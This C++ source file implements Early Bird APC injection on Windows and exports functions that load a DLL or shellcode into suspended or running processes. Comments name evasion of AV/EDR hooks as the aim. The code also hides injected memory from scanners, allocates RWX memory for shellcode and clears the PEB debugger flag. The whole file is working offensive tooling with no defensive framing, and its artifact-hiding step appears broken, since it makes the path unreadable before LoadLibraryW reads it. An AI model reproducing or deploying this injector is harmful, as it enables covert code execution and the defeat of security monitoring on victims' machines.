// EarlyBird.cpp - Early Bird APC Injection Implementation
#include <Windows.h>
#include "../../include/nt_compat.hpp"
#include <iostream>
#include <string>
#include "../../include/StrUtil.h"
#include <vector>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")

// Undocumented functions

extern "C" {
    NTSTATUS NTAPI NtQueueApcThread(
        HANDLE ThreadHandle,
        PIO_APC_ROUTINE ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        ULONG Reserved
    );

    NTSTATUS NTAPI NtAlertResumeThread(
        HANDLE ThreadHandle,
        PULONG SuspendCount
    );
}

class EarlyBirdInjection {
private:
    struct INJECT_INFO {
        HANDLE ProcessHandle;
        HANDLE ThreadHandle;
        PVOID RemoteBuffer;
        SIZE_T BufferSize;
        bool Success;
    };

public:
    EarlyBirdInjection() {
        std::cout << "[EarlyBird] Injection engine initialized" << std::endl;
    }

    // Main injection function - creates process suspended and injects before execution
    bool InjectDll(const std::wstring& targetExe, const std::wstring& dllPath, const std::wstring& commandLine = L"") {
        std::cout << "[EarlyBird] Starting injection into: " << Narrow(targetExe) << std::endl;

        INJECT_INFO info = { 0 };

        // Step 1: Create target process in suspended state
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        std::wstring cmdLine = targetExe;
        if (!commandLine.empty()) {
            cmdLine += L" " + commandLine;
        }

        if (!CreateProcessW(
            targetExe.c_str(),
            const_cast<LPWSTR>(cmdLine.c_str()),
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            std::cerr << "[EarlyBird] Failed to create process: " << GetLastError() << std::endl;
            return false;
        }

        info.ProcessHandle = pi.hProcess;
        info.ThreadHandle = pi.hThread;

        // Step 2: Allocate memory in target process
        SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
        info.RemoteBuffer = VirtualAllocEx(
            pi.hProcess,
            NULL,
            dllPathSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (!info.RemoteBuffer) {
            std::cerr << "[EarlyBird] Failed to allocate memory: " << GetLastError() << std::endl;
            CleanupAndTerminate(info);
            return false;
        }

        // Step 3: Write DLL path to allocated memory
        if (!WriteProcessMemory(
            pi.hProcess,
            info.RemoteBuffer,
            dllPath.c_str(),
            dllPathSize,
            NULL
        )) {
            std::cerr << "[EarlyBird] Failed to write memory: " << GetLastError() << std::endl;
            CleanupAndTerminate(info);
            return false;
        }

        // Step 4: Queue APC to main thread (before any AV/EDR hooks are installed)
        LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
        if (!loadLibraryAddr) {
            std::cerr << "[EarlyBird] Failed to get LoadLibraryW address" << std::endl;
            CleanupAndTerminate(info);
            return false;
        }

        if (!QueueUserAPC((PAPCFUNC)loadLibraryAddr, pi.hThread, (ULONG_PTR)info.RemoteBuffer)) {
            std::cerr << "[EarlyBird] Failed to queue APC: " << GetLastError() << std::endl;
            CleanupAndTerminate(info);
            return false;
        }

        std::cout << "[EarlyBird] APC queued successfully" << std::endl;

        // Step 5: Hide injection artifacts (optional)
        if (HideInjectionArtifacts(pi.hProcess, info.RemoteBuffer)) {
            std::cout << "[EarlyBird] Injection artifacts hidden" << std::endl;
        }

        // Step 6: Resume thread to execute APC
        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            std::cerr << "[EarlyBird] Failed to resume thread: " << GetLastError() << std::endl;
            CleanupAndTerminate(info);
            return false;
        }

        std::cout << "[EarlyBird] Process resumed, injection successful!" << std::endl;

        // Cleanup handles
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return true;
    }

    // Advanced: Inject with multiple APCs for redundancy
    bool InjectWithMultipleAPCs(const std::wstring& targetExe, const std::vector<std::wstring>& dllPaths) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        if (!CreateProcessW(
            targetExe.c_str(),
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            return false;
        }

        LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
        bool allSuccess = true;

        for (const auto& dllPath : dllPaths) {
            SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
            PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, dllPathSize,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (remoteBuffer) {
                if (WriteProcessMemory(pi.hProcess, remoteBuffer, dllPath.c_str(), dllPathSize, NULL)) {
                    if (!QueueUserAPC((PAPCFUNC)loadLibraryAddr, pi.hThread, (ULONG_PTR)remoteBuffer)) {
                        allSuccess = false;
                    }
                } else {
                    allSuccess = false;
                }
            } else {
                allSuccess = false;
            }
        }

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return allSuccess;
    }

    // Inject into existing process using APC
    bool InjectIntoExistingProcess(DWORD processId, const std::wstring& dllPath) {
        // Open target process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (!hProcess) {
            std::cerr << "[EarlyBird] Failed to open process: " << GetLastError() << std::endl;
            return false;
        }

        // Allocate memory for DLL path
        SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
        PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!remoteBuffer) {
            CloseHandle(hProcess);
            return false;
        }

        // Write DLL path
        if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath.c_str(), dllPathSize, NULL)) {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Get LoadLibraryW address
        LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");

        // Find a thread to inject into
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        THREADENTRY32 te32 = { sizeof(te32) };
        bool injected = false;

        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == processId) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        // Suspend thread, queue APC, resume
                        SuspendThread(hThread);
                        if (QueueUserAPC((PAPCFUNC)loadLibraryAddr, hThread, (ULONG_PTR)remoteBuffer)) {
                            injected = true;
                            std::cout << "[EarlyBird] APC queued to thread: " << te32.th32ThreadID << std::endl;
                        }
                        ResumeThread(hThread);
                        CloseHandle(hThread);

                        if (injected) break;
                    }
                }
            } while (Thread32Next(hSnapshot, &te32));
        }

        CloseHandle(hSnapshot);
        CloseHandle(hProcess);

        return injected;
    }

private:
    // Hide injection artifacts from memory scanners
    bool HideInjectionArtifacts(HANDLE hProcess, PVOID remoteBuffer) {
        // Method 1: Modify memory protection to PAGE_NOACCESS after write
        DWORD oldProtect;
        if (VirtualProtectEx(hProcess, remoteBuffer, sizeof(PVOID), PAGE_NOACCESS, &oldProtect)) {
            // Memory will be inaccessible until accessed by LoadLibraryW
            return true;
        }

        // Method 2: Scramble the path until needed
        // This would require a small shellcode stub to descramble

        return false;
    }

    // Cleanup and terminate process on failure
    void CleanupAndTerminate(INJECT_INFO& info) {
        if (info.RemoteBuffer && info.ProcessHandle) {
            VirtualFreeEx(info.ProcessHandle, info.RemoteBuffer, 0, MEM_RELEASE);
        }

        if (info.ProcessHandle) {
            TerminateProcess(info.ProcessHandle, 0);
            CloseHandle(info.ProcessHandle);
        }

        if (info.ThreadHandle) {
            CloseHandle(info.ThreadHandle);
        }
    }

    // Advanced: Inject with custom shellcode
    bool InjectShellcode(HANDLE hProcess, HANDLE hThread, const BYTE* shellcode, SIZE_T shellcodeSize) {
        // Allocate memory for shellcode
        PVOID remoteShellcode = VirtualAllocEx(
            hProcess,
            NULL,
            shellcodeSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!remoteShellcode) {
            return false;
        }

        // Write shellcode
        if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            return false;
        }

        // Queue APC to execute shellcode
        if (!QueueUserAPC((PAPCFUNC)remoteShellcode, hThread, 0)) {
            VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
            return false;
        }

        return true;
    }

public:
    // Stealth injection with PEB manipulation
    bool StealthInject(const std::wstring& targetExe, const std::wstring& dllPath) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // Create process suspended
        if (!CreateProcessW(targetExe.c_str(), NULL, NULL, NULL, FALSE,
                          CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }

        // Get PEB address
        PROCESS_BASIC_INFORMATION pbi;
        ULONG returnLength;

        typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
            HANDLE ProcessHandle,
            PROCESSINFOCLASS ProcessInformationClass,
            PVOID ProcessInformation,
            ULONG ProcessInformationLength,
            PULONG ReturnLength
        );

        auto NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");

        if (NtQueryInformationProcess) {
            if (NT_SUCCESS(NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                                                    &pbi, sizeof(pbi), &returnLength))) {
                // Read PEB
                PEB peb;
                if (ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
                    // Modify PEB to hide our DLL
                    // This would involve manipulating the loader data structures

                    // Clear BeingDebugged flag
                    BYTE notBeingDebugged = 0;
                    WriteProcessMemory(pi.hProcess,
                                     (PBYTE)pbi.PebBaseAddress + offsetof(PEB, BeingDebugged),
                                     &notBeingDebugged, sizeof(BYTE), NULL);
                }
            }
        }

        // Now perform standard injection
        SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
        PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, dllPathSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (remoteBuffer) {
            WriteProcessMemory(pi.hProcess, remoteBuffer, dllPath.c_str(), dllPathSize, NULL);

            LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
            QueueUserAPC((PAPCFUNC)loadLibraryAddr, pi.hThread, (ULONG_PTR)remoteBuffer);
        }

        // Resume process
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        return true;
    }
};

// Export functions
extern "C" {
    __declspec(dllexport) bool EarlyBirdInject(const wchar_t* targetExe, const wchar_t* dllPath) {
        EarlyBirdInjection injector;
        return injector.InjectDll(targetExe, dllPath);
    }

    __declspec(dllexport) bool EarlyBirdInjectExisting(DWORD pid, const wchar_t* dllPath) {
        EarlyBirdInjection injector;
        return injector.InjectIntoExistingProcess(pid, dllPath);
    }

    __declspec(dllexport) bool EarlyBirdStealthInject(const wchar_t* targetExe, const wchar_t* dllPath) {
        EarlyBirdInjection injector;
        return injector.StealthInject(targetExe, dllPath);
    }
}
